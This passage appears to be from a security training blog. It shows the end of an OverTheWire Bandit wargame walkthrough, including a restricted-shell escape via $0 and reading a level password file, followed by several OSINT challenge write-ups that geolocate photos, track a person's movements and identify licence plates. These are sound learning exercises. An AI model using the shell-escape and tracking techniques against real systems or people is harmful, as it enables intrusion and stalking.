to the remote branch, we get the password in the push output as shown below.\nbandit31@bandit:/tmp/32a/repo$ echo \u0026#34;May I come in?\u0026#34; \u0026gt; key.txt bandit31@bandit:/tmp/32a/repo$ ls key.txt README.md bandit31@bandit:/tmp/32a/repo$ git add key.txt The following paths are ignored by one of your .gitignore files: key.txt hint: Use -f if you really want to add them. hint: Turn this message off by running hint: \u0026#34;git config advice.addIgnoredFile false\u0026#34; bandit31@bandit:/tmp/32a/repo$ git add -f key.txt bandit31@bandit:/tmp/32a/repo$ git commit -m key.txt [master 1692a26] key.txt 1 file changed, 1 insertion(+) create mode 100644 key.txt bandit31@bandit:/tmp/32a/repo$ git push origin master The authenticity of host \u0026#39;localhost (127.0.0.1)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory \u0026#39;/home/bandit31/.ssh\u0026#39; (Permission denied). Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts). This is an OverTheWire game server. More information on http://www.overthewire.org/wargames !!! You are trying to log into this SSH server on port 22, which is not intended. bandit31-git@localhost: Permission denied (publickey). fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists. bandit31@bandit:/tmp/32a/repo$ GIT_SSH_COMMAND=\u0026#34;ssh -p 2220\u0026#34; git push origin master The authenticity of host \u0026#39;[localhost]:2220 ([127.0.0.1]:2220)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory \u0026#39;/home/bandit31/.ssh\u0026#39; (Permission denied). Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | \u0026#39;_ \\ / _` | \u0026#39;_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit31-git@localhost\u0026#39;s password: Enumerating objects: 4, done. Counting objects: 100% (4/4), done. Delta compression using up to 2 threads Compressing objects: 100% (2/2), done. Writing objects: 100% (3/3), 322 bytes | 322.00 KiB/s, done. Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 remote: ### Attempting to validate files... #### remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: remote: Well done! Here is the password for the next level: remote: [REDACTED] remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: To ssh://localhost/home/bandit31-git/repo ! [remote rejected] master -\u0026gt; master (pre-receive hook declined) error: failed to push some refs to \u0026#39;ssh://localhost/home/bandit31-git/repo\u0026#39; bandit level 32-33 # For this section, we get a different challenge. We are back again at shell escaping as in the levels 25-27.\nI tried a few commands in uppercase and lowercase but got nothing as shown below.\nhe following locations: * gef (https://github.com/hugsy/gef) in /opt/gef/ * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us on discord or IRC. Enjoy your stay! WELCOME TO THE UPPERCASE SHELL \u0026gt;\u0026gt; help sh: 1: HELP: Permission denied \u0026gt;\u0026gt; HELP sh: 1: HELP: Permission denied \u0026gt;\u0026gt; LS sh: 1: LS: Permission denied \u0026gt;\u0026gt; There’s a possibility that this shell is actually a script being executed through another shell. If that’s the case, we might be able at least in theory to invoke that shell using the special variable $0. You can read more about what $0 does here. Even if the shell automatically converts input to uppercase (as in our special UPPERCASE SHELL), $0 would remain unchanged. So, let’s try using it:\nsh: 1: HELP: Permission denied \u0026gt;\u0026gt; HELP sh: 1: HELP: Permission denied \u0026gt;\u0026gt; LS sh: 1: LS: Permission denied \u0026gt;\u0026gt; $0 $ ls uppershell $ pwd /home/bandit32 $ ls -la total 36 drwxr-xr-x 2 root root 4096 Apr 10 14:23 . drwxr-xr-x 70 root root 4096 Apr 10 14:24 .. -rw-r--r-- 1 root root 220 Mar 31 2024 .bash_logout -rw-r--r-- 1 root root 3771 Mar 31 2024 .bashrc -rw-r--r-- 1 root root 807 Mar 31 2024 .profile -rwsr-x--- 1 bandit33 bandit32 15140 Apr 10 14:23 uppershell $ We now have a shell, we can try to get the password for level 33 by concatenating the contents of the file /etc/bandit_pass/bandit33.\n$ cat /etc/bandit_pass/bandit33 [REDACTED] $ bandit level 33-34 # We are finally done with the challenges.\nbandit33@bandit:~$ ls README.txt bandit33@bandit:~$ cat README.txt Congratulations on solving the last level of this game! At this moment, there are no more levels to play in this game. However, we are constantly working on new levels and will most likely expand this game with more levels soon. Keep an eye out for an announcement on our usual communication channels! In the meantime, you could play some of our other wargames. If you have an idea for an awesome new level, please let us know! bandit33@bandit:~$ 😉Till next time guys :)\n","date":"4 June 2025","externalUrl":null,"permalink":"/posts/bandit/","section":"Posts","summary":"overthewire wargames bandit series","title":"overthewire bandit war games","type":"posts"},{"content":"","date":"31 March 2025","externalUrl":null,"permalink":"/tags/osint/","section":"Tags","summary":"","title":"OSINT","type":"tags"},{"content":" Exercise 31 # For this challenge we are required to find the giraffe and the status of the giraffe at the new location. Below is the task briefing\nThe newborn giraffe seen in the photo below belongs to an endangered species. Individuals such as this one, born in captivity, often participate in conservation programs. This may include transfers to accredited facilities for carefully planned breeding efforts aimed at ensuring the survival of their species. Your task is to find the following information regarding the individual seen below: a) Location and date of birth. b) Current residence and date of arrival. c) A photo in its current habitat. Below is the image of the giraffe.\nLocation and date of birth. # We shall start by first performing an image reverse search.\nAs seen above we have been able to find a source that contains an image that is a replica of our challenge image, we can click on the link of the image and find where the giraffe is located.\nWe have been able to identify more photos of the same baby giraffe as shown below.\nand our challenge photo was from the blog itself as shown below.\nFrom the blog, the baby giraffe is a girl, furthermore, from the blog we have two conflicting dates when the giraffe was born from the top the date is said to be October 23rd and as we go on to read more about the giraffe we find that the giraffe was again born on October 21 at 9:15 p.m so which date is true?\nFrom the blog, the giraffe was born at Virginia zoo and we are provided with a link to the zoo’s website, we can try and search the website on web archive and see if we can fin a post about the giraffe’s birth as endangered species’ birth are usually a big deal and they require protection from poachers.\nAs seen above, going to the snapshot of November 2 2009 we get the post of a masai giraffe that was born on October 22, 2009. Clicking on the link, we find that the page was archived on October 31 and below is the blog\nWe have a date that has two sources October 21, 2009 at 9:15pm on the archived post, the date was on a Wednesday and after clarifying the date it was truly on a Wednesday.\nFrom the archived blog, we have a link that shows more images of the same baby giraffe.\nand as seen above again, we have the same date again of October 21 2009 therefore, with that information we can now say our baby Giraffe was born on October 21, 2009\nAnswer: Virginia Zoo date: October 21, 2009\nCurrent residence and date of arrival # We now know the names of the parents to the baby Giraffe father 8-year-old male, Billy and mother 7-year-old female, Imara and it belong to the masai Species. We can now search for the parents on the website we initially found after doing reverse image search and see what details we shall find about the parents of the daughter.\nFrom the new blog entry, we have some interesting information as shown below.\nWe have the name of our baby Giraffe birthed by Imara who is at Disney's Animal Kingdom in Florida. We shall search for this location and see if the giraffe is the same baby who was Virginia Zoo.\nThe source we found above, gave more information about the birthed Giraffe as shown below.\nFrom the description on the blog above it matches our baby Giraffe, now we know our Giraffe is called Willow and was moved to Disney's Animal Kingdom in Florida on October 12 but we do not know which year the baby arrived at the Kingdom we shall search and find out on google.\nFrom the source above, searching fro October 12, I got 2010 this is because from the post Wilow is 1-year-old and she was born on October 21 2009.\nTo verify I searched what day of the week it was on October 12, 2010 as seen below and it was truly a Tuesday.\nAnswer: Disney's Animal Kingdom in Florida arrival date: October 12, 2010\nA photo in its current habitat # The search we did earlier of our baby Giraffe, we got many results and scrolling through the results I got a link claiming to be of our baby Giraffe as shown below.\nThis source was a false source as the image we have is not of a masai giraffe neither of a reticulated giraffe.\nBelow is the image from the found source.\nAs seen this giraffe is neither a reticulated nor a Masai Giraffe. We can redefine our search and try again as shown below.\nFrom the source identified we have found our girafffe but we shall verify if it is truly the one .\nand we have clearly identified Willow as shown above below is the actual image.\n","date":"31 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-31/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 31)","type":"posts"},{"content":"","date":"31 March 2025","externalUrl":null,"permalink":"/categories/sofia-santos-osint-exercises/","section":"Categories","summary":"","title":"Sofia Santos' OSINT Exercises","type":"categories"},{"content":" Exercise 29 # This challenge was quite a tough one as we are required to know which book the person was reading yet the image from the challenge is too blurry. Below is the task briefing.\nI took the photo below whilst riding a train in the UK. I always prefer quiet areas where no one can sit behind me because, in a public space, no information is truly private. Your task is to: a) Uncover what the person in front of me was reading. b) Identify the train model. c) Identify my seat number. Here is the image we are to use for our investigation.\nUncover what the person in front of me was reading. # For this section, we shall try and identify few words from the text if they are visible enough for us to read. From the image, it is clearly seen to be a reflection , I will try and turn the image to identify words.\nAs seen above we have been able to flip the image horizontally, we can try and read the words using the old book technique of squinting(can use this technique if you do not have eye problems).\nAs seen above we are able to identify few words She has the letters from William's cousin james we can search for a book with this words. After some searches online, I came across google’s advance book search that you can use to search a book with specific words, let us try it out and see what we shall find. This route gave me a lot of books to identify, however, since this challenge was solved some time back with other participants, I tried to search for the words on google using this google dork query \u0026quot;She has the letters from William's cousin james\u0026quot; book and got the book as shown below.\nand to verify if truly it was the book, I searched for the words we identified and got the words clearly.\nAnswer: Sara Sheridan’s book, The Fair Botanists.\nIdentify the train model # For this section we shall first start by analyzing the image as shown below.\nWith this features identified, we can now try and search online for trains in UK with red and grey themed seats with QR code label sticker at the back.\nUsing the description, I was able to get a link to LNER trains FAQ page, thanks to the sites SEO mechanisms implemented. Looking around the website, I was able to identify a few features we saw in our image analysis.\nThis is an advert form the our trains page. From this page, I explored different classes standard,first class and our Azuma but for our Azuma I got a seat map rather than how the seats look like, therefore I decided to search for the LNER train azuma seats.\nWe have found our train. From the description it is one of the standard class coaches of an 800 series Azuma train\nAnswer: LNER Azuma train\nIdentify the seat number # For this section, I had to reason some things, first Sofia being an OSINT analyst would like seat at the back as she is cautious of her privacy, two she would go for a quieter place as most investigative cyber security practitioners prefer a place with less noise for rest and peace of mind and from the image the person was seating in front of Sofia, therefore, she is seated somewhere at the back near a window.With this information we can use the seat map for azuma we found earlier\nAs seen above, after searching for quieter, we get coach H. We can go to this coach and find which seats are at the back.\nWe have found the map for coach H, now with the previous views Back seat near a window we have two seats 88 and 83. Let us go back to our challenge image and look at it again closely after we rotated it horizontaly.\nFrom this image, we can conclude the person was reading the ebook seated at seat 79p therefore Sofia was at seat 83. The reason behind this is if the person was seated at seat 86 and Sofia took her a photo, the reflection would be different because, the image would show her left arm too and the ebook would be at a distant from the window.\nAnswer: 83\n","date":"30 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-29/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 29)","type":"posts"},{"content":" Exercise 27 # For this challenge, we are required to find the following details outlined in the task briefing below.\nThe image below shows a group of people sitting in front of a large screen that reads “Lectura en Movimiento en Lima”. A speaker can be seen standing on the left-hand side in front of three large flags. Your task is to: a) Name the speaker. b) Identify what he was wearing on his lapel. c) Find footage of his speech. Below is the image we are required to investigate.\nFrom the above image we can see some clear details we can use. First the event name lectura en movimiento en lima . This information is not sufficient enough we can start by doing some reverse image search.\nName the speaker. # We shall start first by performing a reverse image search to identify this event.\nwe have found some interesting sources, clicking on this link from one of our identified sources, I got the blog shown below with some images and details about the members who were in the event whom we can identify and features that are similar.\nReading through the blog, we get our person Juan Carlos Ruiz but we shall verify if truly he is aour speaker.\nAs seen above, we have been able to put some details that makes the person identified be the true person as from the image form the blog it is just a clearer zoomed version of the challenge image.\nWe found his full name on Linkedin as shown below.\nAnswer: Juan Carlos Ruiz Rodriguez\nwhat he was wearing on his lapel # For this section, we shall search for our person and try to identify what he was wearing on his lapel.\nThis is the image from the blog page we found earlier showing our person of interest more clearer.\nAfter searching our person online, we are able to identify him more closer showing the item on his lapel as shown below from this link\nAnswer: OEI logo\nFind footage of his speech # I searched for the videos of the event and found a youtube link with the speech of the director starting at 9:30 and ending at 18:14\n","date":"29 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-27/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 27)","type":"posts"},{"content":" Exercise 28 # For this challenge we are provided with an image that we are required to find the details of the image as briefed below.\nSometimes the fastest way to geolocate an image is to track down the movements of the person behind the lens. I took the photo below, on 20 September 2023, at 08:11 local time. Your task is to determine: a) What device I used to take the photograph. b) Where I was headed. c) How far I was from the entrance of my destination. there is also a bonus challenge Bonus challenge: In which hotel did I stay?\nAbove is the full image from the challenge.\nWhat device I used to take the photograph # For this question we can check the image file metadata, metadata simply refers to a set of data that describes and gives information about other data.\nWe can use this tool to check the metadata of the image file or if you are using a UNIX based machine like kali linux, you can use a tool called exiftool the syntax to run the command is exiftool \u0026lt;filename\u0026gt; below is the details of the device used as seen in the metadata extractor.\nsearching the code of the machine online we get the following details\nThe code identifies the device as Samsung Galaxy A12\nAnswer: Samsung SM-A125F camera model or Samsung Galaxy A12\nWhere I was headed # For this, we can start first by identifying where the person was on the time she was taking the photo. From the metadata, coordinates of the location of the image are usually embedded on the image, we can check if we have any longitude and latitude coordinates on the image metadata. There are no coordinates.\nWait from the task briefing, the image was taken on 20 September 2023, we can filter for this date for any of her post on either of her social platforms to see where she was heading. We shall start with twitter by using some search dork queries for the specific date.\nbingo we found a tweet that could be of interest, I played around with tweaking the dates form 20th to 3oth of September 2023 and came across this tweet, from the tweet, Sofia was part of the celebration of women in OSINT, going through the tweet pictures, I got this letter of appreciation dated 20th September 2023 on which Sofia was recognized for her contribution to the SIRUS CTF finale.\ntherefore Sofia was headed to the Europol’s event of women in OSINT. As seen from the post above, this is a good recognition to Sofia Santos, we could search this pot on her LinkedIn and see if we shall find more details of where she was headed for the event.\nwe have found the post, we can now go and check it out.\nWe have found more details, we can now search the Europol headquarters in Netherlands.\nWe have been able to find the headquarters’ location Eisenhowerlaan 73, 2517 KK The Hague, Netherlands\nAnswer: Eisenhowerlaan 73, 2517 KK The Hague, Netherlands\nHow far I was from the entrance of my destination # For this question lets first try and find the location on which the image was taken from as it could be near the venue but first I was able to identify some useful information on the image as seen below when zoomed closer.\nThe number 55. We can try and search for something like Eisenhowerlaan 55 on google maps and see if the place matches our image.\nAs seen above, we have been able to locate the building on Eisenhowerlaan 55 we can now try and calculate the distance from this point to Eisenhowerlaan 73 where the Europol headquarters is.\nAs seen above we have been able to locate the two places how far they were from each other and got the distance as approximately 198 metres\nAnswer: 198 metres\nWhich hotel did I stay? # From the LinkedIn post, we can see an image of Sofia Santos holding a medal but the background is a bit blurred our, however, we can be able to see some features we can use to identify the hotel in which Sofia stayed.\nAs seen from the image above it is blurry but we are able to identify some features we can use to pinpoint the location on google earth pro.\nI toured around Netherlands from the location of Europol headquarters and found a location with similar building structure which we highlighted with black as seen above.\nZooming in closer, we got the following houses from the image.\nAt this location, we can look around for hotels that have a similar balcony as that on the image.\nAfter playing around with google street view, I was able to locate a hotel with similar balcony structure as that in the image and the hotel location is as shown below.\nWith that we have been able to find our hotel as shown below.\nthe name of the hotel is Ibis Styles Den Haag Scheveningen\nAnswer: Ibis Styles Den Haag Scheveningen ","date":"29 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-28/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 28)","type":"posts"},{"content":" Exercise 26 # For this challenge we are provided with a zip folder containing some images and a video, we are required to find the train station the person boarded and alighted from.\nThe image below shows the contents of a zip file. Inside you will find a 31-second video recorded during a train ride, and four photos of undisclosed locations. They were all taken by the same individual in February 2024. Despite having no useful metadata, they still contain enough information to track down this person’s movements. Your task is to determine: a) At which train stations did the person board and alight? Here is the link to the zip file\nFurthermore, the challenge has some bonus questions we can try to answer as shown below.\nBonus challenges: Identify the mode of transportation in each image. Determine the type of train they rode. Estimate the speed at which the train was travelling when the footage was recorded. Calculate approximately how far did the person travel overall. Photo 1 # We shall start with the photo below for our analysis\nFor this photo we can try by doing an image reverse search to find where this location is from.\nAs seen above, we have been able to locate the location Chorsu Bazaar Uzbekistan we can look at this location on google maps and try identify where this photo was taken from using street view and comparing the image alongside the view.\nThis approach was quite challenging, we shall first start by analyzing our photo to see what we can identify.\nAs seen above we have been able to identify some features from the image and furthermore, the person was at a higher ground as the people seen on the image are at a lower place.\nWe can try and crop the image to find the building we have identified on the image and see where it is located.\nWe have found our building it is called Tts \u0026quot;Chorsu\u0026quot; as seen below on the google maps\nWith that we have been able to see where the photo was taken from Chorsu Bazaar Uzbekistan but we need to verify the location where our person took the photo, we can try and search on earth pro.\nWe are unable to find any street views in particular to our image but I was able to identify a probable location where our person was by the time of taking the image.\nFrom the image analysis, the person was traveling on foot as this is a busy market place and from where he.she was taking the photo, it seems the person was seated and many shops were not open, it was therefore morning hours, the person could be enjoying a cup of tea or coffee from the shop he or she was. The name of the city was Tashkent.\nAnswer: 41°19'34.6\u0026quot;N 69°14'05.8\u0026quot;E, mode of transport: By foot\nPhoto 2 # For this section, we shall be looking at this photo.\nWe can start by an image reverse search just like the previous image.\nAs seen above, we have been able to find the location Navruz park, Tashkent Uzbekistan\nAs seen above we have located our location, moreover from the image, it was in the morning as there are no shops that area open at the moment. The mode of transport used was on foot.\nAnswer: 41°19'34.2\u0026quot;N 69°15'57.8\u0026quot;E ,mode of transport: By foot\nPhoto 3 # Our third photo to analyze is as shown below.\nLet us try and do it differently, we shall start by analyzing the photo for features we can use to identify the location as shown below.\nWe have been able to identify two features, we can try a reverse image search and see if we shall find a location with these features. Reverse image search was not sufficient, we shall zoom closer to the image and try find more details.\nAs seen above, there is a car rental shop near by, since the last two photos we saw, were all in Uzbekistan, we can try and search for car rental shops in Tashkent and see which one has the same match as ours.\nAfter some searched, I was able to find a shop that matches the advert color on the poster of the shop.\nWe are now close to the location of our image.\nAs seen above, we are now able to locate where our image was taken from.\nFrom the image the person was on a vehicle, and as the person seems to be traveling a lot, the person is a tourist therefore for this case means of transport could be a taxi.\nAnswer: 41°17'57.6\u0026quot;N 69°16'21.1\u0026quot;E, mode of transport: Taxi\nVideo # For this video, we need to think about the context: the images we are analysing seem to be from someone’s camera roll. They are named like a digital camera would name images: incrementally. Thus this video, IMG_2677, has been taken after the three images we already localised: IMG_2597 (Chorsu Bazaar), IMG_2626 (Halva Café) and IMG_2658 (Subway entrance). It would stand to reason that the train this person took departed from Tashkent.\nIf we take a look at a map of the railways in Uzbekistan, there are 4 railways leaving Tashkent:\nLooking at the video, we are able to identify some details shown in the image below.\nThere are mountains in the background with some pattern.\nThe sun on the image is to the left, that is behind the train, we can check the sun position using suncalc as shown below.\nPosition of the sun on February 15th 2024 at 12:01\nThis suggests that the train was most likely heading southwest, following the fourth railway on our map. The next major stop along this route is Samarkand. When examining this region on Google Earth, only the final third of the journey (highlighted in red below) appears to feature the mountainous terrain visible in the video.\nAt last now we have a smaller location to search, from here, I looked for the unique patterns we saw on the mountains and found them as shown below.\nMoving along the site, I was able to identify a location that has a fuel station and a junction where cars cross the train tracks and found the following location.\nFrom the image above we have been able to identify our location.\nAnswer: 40°05'50.9\u0026quot;N 67°48'11.7\u0026quot;E\nPhoto 4 # This photo too we shall first try and analyze it and see features we can use to locate our place, then perform a reverse image search.\nAfter identifying the features, we shall use this details to confirm our location. As from the video, we have found the person was probably heading to Samarkand , we can look around this region to see if we can identify any overpasses with these features.\nSearching through the region, we are able to get our location a shown below.\nAnswer: 39°39'54.0\u0026quot;N 66°58'47.2\u0026quot;E mode of transport: Taxi\nTrain stations and speed traveled # From our analysis from Tashkent, I was able to locate train stations near by. As from the location of where the person was from the market to the picture taken while on a taxi near a bus stop, we can conclude the train station he/she boarded the train from is Stantsiya Tashkent Pass Tsentr as shown below.\nStation where the person boarded the train Stantsiya Tashkent Pass Tsentr\nThe location he alighted the train station is Samarkand station.Since now we now the train station the person boarded and alighted from, we can search for the type of trains found in Stantsiya Tashkent Pass Tsentr, where the person boarded the train.\nTo decide which train was used, I checked the train timetable here as shown below.\nthe train used is therefore Afrosiyob Train as it is fast and from the timetable the trips are usually made on a daily basis.\nSpeed the train traveled during recording. # As seen above, the distance of the train during the time of recording is 0.19 miles and the duration was 8 Seconds ,therefore after calculation, the speed is 85.5 mph as shown below.\nAnswer: 85.5 mph\nTotal distance covered # As shown below the distance calculated roughly from the market to the Tashkent train station is 7.4 km\nA quick Google search for the train distance between Tashkent and Samarkand yields about five vastly different figures. I opted for what seemed to be the most reliable source, which estimated it at approximately 300 km.\nFinally, the distance from the Samarkand Train Station to the Siyob Hostel—which I assume is the person\u0026rsquo;s accommodation, given its closeness to the approximate viewpoint of the last photo—is:\n5.3km\nTherefore total is approximately distance covered is 312.7 km\n","date":"28 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-26/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 26)","type":"posts"},{"content":" Exercise 25 # For this challenge, we are required to locate the building with the art on the image and find another quote on the same building with a quote containing the word anarchy as indicated in the task briefing.\nThe world is full of anonymous quotes. Several were written in the unidentified building seen below. Your task is to: a) Locate the building. b) Find the quote containing the word “anarchy”. Below is the image of the quote on the wall.\nLocate the building # For this area we shall start by performing a simple reverse image search to find some details about the art. From the reverse search we get a couple of results as shown below.\nLooking at the reddit source, it says it is in France, however, to verify if it is true, we shall now use the quote itself to search for the location as the quote seems to be behind a bigger mantra.\nUsing the quote itself I came across this blog with an image that looks similar to the challenge photo as shown below.\nEven though, the image on the blog is more older than the one on the challenge photo they look similar in many aspects. Moreover, from the blog we have been given a location Sykes Datatronics Rochester, NY we can search for this building and see if we can find more details about it and the art too.\nAs seen above, after searching for the building I visited the first link but got no results of our image but the second one gave me more than I wanted, I also got a photo that was in the same building with the word anarchy hence solving our second question too.\nWhen I zoom closer to the image with the quote is as seen below.\nNow to find the location of the building, we shall go to google maps and search for the building.\nWhen searching for the building on google maps, it redirects to abandoned subway rather than Sykes Datatronics as seen below.\nSince from the blog we identified earlier says the building was unoccupied and was damaged with a number of fires over the year, we could search when it was abolished and use google earth pro to locate it.\nFrom google AI, we now know it was demolished by 2014 furthermore, we have more details from this link where we are told, the building sits empty at Orchard street and we are provided with a link to google maps street view, here is the link.\nAnswer: 384 Orchard Street\nFind the quote containing the word “anarchy” # Scrolling through the album we get our image with a quote that contains the word Anarchy as shown below.\nAnswer: This office was a prison for our brothers and sisters in wage salvery. Let's make it a carnival for our brothers and sisters in anarchy\n","date":"27 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-25/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 25)","type":"posts"},{"content":" Exercise 24 # For this challenge, we are required to find where the members in the photos pay their allegiance to as indicated in the task briefing below.\nThere are countless armed insurgent groups spread throughout the globe. The three images below depict individuals associated with internationally recognised terrorist organisations. Your task is to identify to which group they have pledged their allegiance. a) Photo 1 b) Photo 2 c) Photo 3 The links to the photos are as follows, photo 1, photo 2, photo 3 and below are the photos too as well.\nPhoto 1 # For this photo below, we shall start by performing a reverse image search.\nAfter performing a reverse image search, we get the following date as shown below.\nI clicked on the youtube link and got clear image of how the members look and the uniform attribute.\nThe group is based in Colombia and is referred to as Ejército de Liberación Nacional(ELN) as of Wikipedia source and below is the logo of the army.\nAnswer: ELN(Ejército de Liberación Nacional)\nPhoto 2 # For this image I started by performing a reverse image search on all search engines but the one that provided me with details replica to the image was from yandex as shown below.\nClicking on the link, I got some details I could use to search for more details about the image as shown below.\nWe can now search for Kurdistan female terrorist groups and see what we can find.\nAs seen above there is a party that is popping up a lot PKK. Searching more details about it, I found that the party is referred to as *Partiya Karkerên Kurdistanê* or the Kurdistan Workers’ Party.\nLooking at the uniform of the PKK female fighters and the one we have on the challenge image, they do not look similar at all as shown below.\nFollowing through the blog on wikipedia I came across, the Syrian Democratic Forces, having the knowledge Syria has been prone to terrorist attacks, I clicked on the link to get more details about it.\nFrom the screenshot above, showing how SDF was established the YPG and YPJ are the same people, although YPG(Yekîneyên Parastina Gel) or People’s Protection Unit is male based and YPJ(Yekîneyên Parastina Jin) or Women’s protection unit is female based. Below is the flag of the different groups.\nThey both have the same star but with different surroundings, we are getting close, next, I searched for the uniform of YPJ members to see how it looks like, below is the image of the uniform.\nIt is different form the one on the challenge as it is not too bright like for YPJ. I decided to go back to our first finding of PKK where there is another female unit referred to as YJA-STAR, The female military wing whose flag looks as shown below.\nThis was quite a ride, searching online for the uniform of the unit, I got the following\nThe have the same uniform, therefore, we can now attribute that the female in our challenge photo is of the YJA-STAR group.\nAnswer: YJA-STAR\nPhoto 3 # For this image I first began by analyzing the contents of the image as shown below.\nAfter analyzing the image, I then searched for terrorist group with the flag description.\nAs seen above, we have found a unique flag matching our description, the group is referred to Jaish al-Adl, we can search the group and see how their uniform looks like.\nIt is now clear, we have our militia group identified as Jaish al-Adl\nAnswer: Jaish al-Adl\n","date":"26 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-24/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 24)","type":"posts"},{"content":" Exercise 23 # For this challenge, we are required to find the details of the photo used as wallpaper as indicated in the task briefing below.\nSometimes online footage contains more information than meets the eye. In October 2023, I uploaded a video to my YouTube channel where, for a split second between minute 3 and 4, my desktop wallpaper is partially visible. **Your task is to:** a) Find the title of the illustration, as given by the artist. b) Find how much it would cost for the artist to create a similar piece, in size and detail. Here is the link to the youtube page. From the task briefing, we are told the video was uploaded on October 2023 and for a split second between minutes 3 and 4, the desktop photo was partially visible. With this information, it was quite clear we are required to play with the , and . on the youtube video as this symbols help in moving the video ahead or behind by a frame, that is the ,moves the video behind a frame and .moves the video ahead by a frame.\nWatching the video from minute 3 to 4 while adjusting the frames, I was able to identify the wallpaper as shown below.\nAt 3 minutes and 38 seconds,we are able to identify the partial wallpaper image after adjusting the frames with .to move the video ahead.\nFind the title of the illustration, as given by the artist # Below is the image we are required to find the title of the illustration.\nWe can do a reverse image search of the image and see what results, we shall get.\nAs seen above, we have been able to identify the exact image, we can follow the link and see what is the title of the image.\nWe have been able to identify the illustration but we have to verify if that is truly the title of the illustration, as we have the name Adam-Scythe,we can search for the name and see if we can find our image.\nAs shown above, this was the result after searching for the artist at DeviantArt with the name Involuntary Rat Queen and we have been able to verify that trully Adam-Scythe is the artist behind the art and the name of the illustration Involuntary Rat Queen.\nAnswer: iNvoluntary Rat Queen\nFind how much it would cost for the artist to create a similar piece, in size and detail # For this section, I decided to search for prices of the arts by Adam-Scythe on DeviantArt profile of his and got the following details and the price for the image that is similar to the one we found.\nAs seen above, we have been able to find the details of the prices for images in the same class as ours.\nAnswer:$190\n","date":"25 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-23/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 23)","type":"posts"},{"content":" Exercise 22 # For this challenge, we are required to find a partial number plate of the trucks and where the camera is located as indicated in the task briefing below.\nThe two images below come from a security camera overseeing a port. They were taken almost nine years apart. Both have a vehicle highlighted. Your task is to: a) Find the link to the camera’s live feed. b) Geolocate the security camera. c) Find the license plate of the vehicle highlighted in blue. d) Find the licence plate of the vehicle highlighted in orange. Note:For the sake of privacy you only need to provide the bottom half of the licence plate containing 2 sets of numeric values, as such: [XX]-[XX]. Below are the images we are required to use for or analysis. Find the link to the camera’s live feed # From the first photo we can identify some details as shown below.\nThe camera live feed is from Yamoto fishing port and it was on March 11, 2015.Although we have been able to identify the port at which the live feed was from, the information is not enough for us to use to get the link of the camera live feed. We can perform a reverse image search and see if we can get more information. After a couple of searches and looking at the note on the challenge * Note: Although it is still possible to find the link, unfortunately, the live feed has been down since January 2025, I was unable to find the live feed but from past participants of this challenge the link that was found to contain the live feed was this link.\nAnswer: http://202.239.224.34/cgi-bin/guestimage.html\nGeolocate the security camera. # For this section, we need to search for the port on google maps and try to identify the street view in order to find the view that looks similar to that in the captured video.\nAs seen above, after analyzing the image and the street view, we are able to identify where the camera is. With further analysis, we area able to identify the location of the camera by zooming in on the street view as shown below.\nThe location of the camera is 38°24'34.1\u0026quot;N 141°14'40.6\u0026quot;E.\nAnswer: 38°24'34.1\u0026quot;N 141°14'40.6\u0026quot;E\nFind the license plate of the vehicle highlighted in blue # We are required to identify the number plate of the truck in this image below.\nFrom the street view, we are unable to identify the vehicle in blue rather the truck in orange, however, form the structure of the truck it seems they are both from the same company, looking at the street view in google maps, I was able to identify the name of the company Aizawa suisan Japan and searched through their website where I was able to identify a truck that is a replica of the one in blue as shown below.\nThe number plate of the truck is 56-36\nAnswer:56-36\nFind the license plate of the vehicle highlighted in orange. # The image of the vehicle we are required to identify on the image is as shown below.\nThis vehicle was easy to identify on google maps as shown below.\nFrom the body of the truck, we can identify the details of the company as Aizawa suisan Japan.\nWe can search for this company and see if we can be able to identify the number plate of the vehicle if they have it on their website. However, we are unable to find the exact image of the truck. I searched for the ;ink to any of their social media pages and found for facebook from this page as shown below.\nthe number plate is 31-20\nAnswer: 31-20\n","date":"24 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-22/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 22)","type":"posts"},{"content":" Exercise 20 # For this challenge we are required to find the contents of the challenge itself as it is not in the link of the challenge as shown below.\nHowever, as we scroll down the page we get a hyperlink on the three dots as shown below but we are redirected to an image that gives us no clue. ![[Pasted image 20250321120831.png]] This is the image we get when we click on the link embedded on the dots.\nAfter 